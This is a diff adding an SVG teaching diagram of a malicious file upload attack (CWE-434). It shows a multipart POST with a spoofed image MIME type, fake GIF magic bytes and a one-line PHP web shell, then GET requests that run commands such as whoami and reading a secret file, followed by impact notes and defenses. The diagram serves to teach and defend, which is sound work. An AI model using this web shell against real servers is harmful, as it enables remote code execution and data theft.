@@ -1,0 +1,63 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1920" height="1080" viewBox="0 0 1920 1080">
+  <defs>
+    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
+      <stop offset="0%" stop-color="#f5f9ff"/>
+      <stop offset="100%" stop-color="#fff8f5"/>
+    </linearGradient>
+  </defs>
+  <rect width="1920" height="1080" fill="url(#bg)"/>
+  <ellipse cx="100" cy="90" rx="200" ry="110" fill="#ffd6e8" opacity="0.45"/>
+  <ellipse cx="1820" cy="100" rx="170" ry="100" fill="#c8e6ff" opacity="0.45"/>
+  <ellipse cx="1750" cy="980" rx="200" ry="95" fill="#fff3b0" opacity="0.4"/>
+  <ellipse cx="140" cy="960" rx="150" ry="80" fill="#d4f5e9" opacity="0.35"/>
+
+  <text x="960" y="62" text-anchor="middle" font-family="Segoe UI,system-ui,sans-serif" font-size="38" font-weight="700" fill="#1e3a5f">Attack: Malicious file upload → PHP web shell (CWE-434)</text>
+  <text x="960" y="98" text-anchor="middle" font-size="20" fill="#555">Attacker only — no MITM. Weak backend trusts multipart headers, stores file, PHP handler executes it.</text>
+
+  <!-- POST -->
+  <text x="80" y="140" font-size="22" font-weight="700" fill="#1e3a5f">Step 1 — HTTP POST (multipart upload)</text>
+  <rect x="80" y="155" width="1080" height="430" rx="12" fill="#1a1a2e" stroke="#e94560" stroke-width="2"/>
+  <text x="100" y="192" fill="#a8e6cf" font-family="ui-monospace,Consolas,monospace" font-size="17">POST /avatar/upload HTTP/1.1</text>
+  <text x="100" y="220" fill="#a8e6cf" font-family="ui-monospace,monospace" font-size="17">Host: vulnerable-shop.example</text>
+  <text x="100" y="248" fill="#ffd93d" font-family="ui-monospace,monospace" font-size="17">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk</text>
+  <text x="700" y="248" fill="#ff6b8a" font-size="14">← request-level (correct for uploads)</text>
+
+  <text x="100" y="285" fill="#888" font-family="ui-monospace,monospace" font-size="15">------WebKitFormBoundary7MA4YWxk</text>
+  <text x="100" y="312" fill="#fff" font-family="ui-monospace,Consolas,monospace" font-size="16">Content-Disposition: form-data; name="avatar"; filename="image.php"</text>
+  <text x="100" y="340" fill="#ffd93d" font-family="ui-monospace,monospace" font-size="16">Content-Type: image/jpeg</text>
+  <text x="520" y="340" fill="#ff6b8a" font-size="14">← part MIME spoofed (file is PHP, not JPEG)</text>
+  <text x="100" y="368" fill="#888" font-family="ui-monospace,monospace" font-size="15">(blank line — start of part body)</text>
+  <text x="100" y="398" fill="#dfe6e9" font-family="ui-monospace,monospace" font-size="16">GIF89a;</text>
+  <text x="180" y="398" fill="#888" font-size="13">optional fake magic bytes</text>
+  <text x="100" y="428" fill="#ff9f43" font-family="ui-monospace,Consolas,monospace" font-size="16">&lt;?php system($_GET['cmd']); ?&gt;</text>
+  <text x="100" y="458" fill="#888" font-family="ui-monospace,monospace" font-size="15">------WebKitFormBoundary7MA4YWxk--</text>
+
+  <rect x="100" y="480" width="1040" height="88" rx="8" fill="#2d3436"/>
+  <text x="120" y="510" fill="#dfe6e9" font-size="15">Why two Content-Types? Outer = multipart wrapper (correct). Inner = per-file part — backend wrongly trusts this instead of extension + bytes.</text>
+  <text x="120" y="538" fill="#dfe6e9" font-size="15">Saved path (typical weak code): public directory + original filename from Content-Disposition →</text>
+  <text x="120" y="562" fill="#7bed9f" font-family="ui-monospace,monospace" font-size="16">/var/www/html/uploads/image.php</text>
+
+  <!-- small ludzik -->
+  <g transform="translate(1220,180)">
+    <circle cx="50" cy="35" r="32" fill="#2d3436"/>
+    <rect x="20" y="68" width="60" height="75" rx="12" fill="#4a69bd"/>
+    <text x="50" y="165" text-anchor="middle" font-size="16" fill="#333">Attacker</text>
+  </g>
+
+  <!-- Step 2 GET -->
+  <text x="80" y="620" font-size="22" font-weight="700" fill="#1e3a5f">Step 2 — HTTP GET (trigger execution)</text>
+  <rect x="80" y="635" width="920" height="165" rx="12" fill="#1a1a2e" stroke="#28a745" stroke-width="2"/>
+  <text x="100" y="675" fill="#a8e6cf" font-family="ui-monospace,Consolas,monospace" font-size="17">GET /uploads/image.php?cmd=whoami HTTP/1.1</text>
+  <text x="100" y="703" fill="#a8e6cf" font-family="ui-monospace,Consolas,monospace" font-size="17">Host: vulnerable-shop.example</text>
+  <text x="100" y="740" fill="#dfe6e9" font-family="ui-monospace,monospace" font-size="16">Apache + mod_php runs image.php → system("whoami") → RCE as www-data</text>
+  <text x="100" y="775" fill="#ff9f43" font-family="ui-monospace,monospace" font-size="15">Example: GET /uploads/image.php?cmd=cat%20/home/app/secret</text>
+
+  <!-- Impact box -->
+  <rect x="1040" y="635" width="800" height="165" rx="12" fill="#f8d7da" stroke="#c0392b" stroke-width="2"/>
+  <text x="1060" y="675" font-size="20" font-weight="700" fill="#c0392b">Impact</text>
+  <text x="1060" y="708" font-size="17" fill="#333">Read secrets, dump DB, install backdoor, pivot.</text>
+  <text x="1060" y="738" font-size="16" fill="#555">Historical pattern: PHP shared hosting + avatar upload (PortSwigger RCE lab).</text>
+
+  <rect x="80" y="840" width="1760" height="72" rx="12" fill="#ffc107"/>
+  <text x="960" y="885" text-anchor="middle" font-size="21" font-weight="700" fill="#1e3a5f">Defense: allow-list extensions, verify magic bytes, random server filename, no script execution in upload dir.</text>
+</svg>
